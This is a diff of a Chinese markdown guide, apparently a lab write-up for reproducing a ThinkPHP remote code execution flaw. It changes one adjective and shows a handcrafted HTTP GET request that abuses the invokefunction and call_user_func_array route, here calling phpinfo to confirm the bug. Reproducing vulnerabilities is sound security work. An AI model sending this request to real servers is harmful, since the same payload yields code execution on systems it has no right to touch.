@@ -11,7 +11,7 @@ markdown
 - 网站根目录必须指向 `public` 文件夹。
 
 ## 3. 验证漏洞
-使用最无害的 `phpinfo` 函数进行验证，手工构造的 Payload 如下：
+使用无害的 `phpinfo` 函数进行验证，手工构造的 Payload 如下：
 
 ```http
 GET /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1
